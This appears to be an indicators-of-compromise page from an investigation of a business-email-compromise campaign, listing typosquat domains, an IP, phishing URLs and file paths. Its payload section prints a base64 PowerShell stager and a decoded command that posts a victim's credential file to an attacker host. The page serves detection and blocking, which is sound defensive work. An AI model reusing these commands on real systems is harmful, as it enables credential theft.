# Indicators of Compromise

All technical IOCs extracted across Parts 1, 2, and 3 of the Horizon Dynamics BEC campaign investigation. Deduplicated, defanged where appropriate, and grouped by type.

A machine-readable version of the same data is available at [`iocs.csv`](iocs.csv).

> **Defanging convention.** URLs and high-risk domains are defanged with `hxxps://` and `[.]` so they can be safely shared and indexed without triggering accidental clicks.

---

## Email addresses

| Value | First seen | Context | Source |
|---|---|---|---|
| `sarah.chen@horizondynarnics.com` | 2026-04-07 | Spoofed CEO sender | Part 1 |
| `it.support@horizondynarnics.com` | 2026-04-09 | Spoofed IT Support sender | Part 2 |
| `bounce-3291@mail.horizondynarnics.com` | 2026-04-09 | Return-Path on attacker infrastructure | Part 2 |
| `helpdesk@horizondynamics-support.net` | 2026-04-09 | Helpdesk contact on secondary attacker domain | Part 2 |

## Domains

| Value | First seen | Role | Source |
|---|---|---|---|
| `horizondynarnics.com` | 2026-04-07 | Typosquat root, used in both emails | Part 1, Part 2 |
| `mail.horizondynarnics.com` | 2026-04-09 | Attacker mail subdomain | Part 2 |
| `horizondynamics-payroll.co` | 2026-04-07 | Lookalike "payroll portal" landing | Part 1 |
| `horizondynamics-support.net` | 2026-04-09 | "Help desk" infrastructure | Part 2 |
| `cdn-horizondynamics.net` | 2026-04-09 | C2 / exfiltration destination (from LSB payload) | Part 2 |

## IPs

| Value | First seen | Role | Source |
|---|---|---|---|
| `185.234.72.19` | 2026-04-09 | Originating SMTP server | Part 2 |

## URLs

| Value | First seen | Role | Source |
|---|---|---|---|
| `hxxps://horizondynamics-payroll[.]co/update` | 2026-04-07 | Phishing landing page (QR + hyperlink target) | Part 1 |
| `hxxps://cdn-horizondynamics[.]net/exfil` | 2026-04-09 | Exfiltration endpoint extracted from steg payload | Part 2 |

## Files / filenames

| Value | Context | Source |
|---|---|---|
| `Payroll_Verification_Form.docm` | Malicious macro-enabled attachment | Part 2 |
| `logo.png` | LSB steganography carrier image | Part 2 |

## File paths on victim host

| Value | Context | Source |
|---|---|---|
| `C:\Temp\logo.png` | Drop location read by the loader | Part 2 |
| `%APPDATA%\payroll_creds.txt` | Credential file targeted for exfiltration | Part 2 |

## Commands / encoded payloads

### Base64-encoded PowerShell stager (full string)

```
powershell -enc cABvAHcAZQByAHMAaABlAGwAbAAgAC0AZQAgACIAJABpAG0AZwAgAD0AIABbAFMAeQBzAHQAZQBtAC4ARAByAGEAdwBpAG4AZwAuAEIAaQB0AG0AYQBwAF0AOgA6AEYAcgBvAG0ARgBpAGwAZQAoACcAQwA6AFwAVABlAG0AcABcAGwAbwBnAG8ALgBwAG4AZwAnACkAOwAgACQAcAB4ACAAPQAgACQAaQBtAGcALgBHAGUAdABQAGkAeABlAGwAKAAwACwAMAApADsAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAJABwAHgAIgA=
```

### Decoded stager (cleartext)

```powershell
powershell -e "$img = [System.Drawing.Bitmap]::FromFile('C:\Temp\logo.png'); $px = $img.GetPixel(0,0); Start-Process $px"
```

### Extracted from steganography in `logo.png`

```powershell
Invoke-WebRequest -Uri "hxxps://cdn-horizondynamics.net/exfil" -Method POST -Body (Get-Content "$env:APPDATA\payroll_creds.txt")
```

## Email authentication artifacts (Email #2)

| Header | Result |
|---|---|
| `spf` | `fail` |
| `dkim` | `none` |
| `dmarc` | `fail action=none` |

---

## How to use these IOCs

- **Immediate block-list:** all *Email*, *Domain*, *IP*, and *URL* rows above.
- **Hunt (last 14 days):** the *File path on victim* rows and the Base64 stager substring.
- **Watch-list:** the *Email authentication artifacts* combined with payroll / financial subject keywords as a correlation rule.
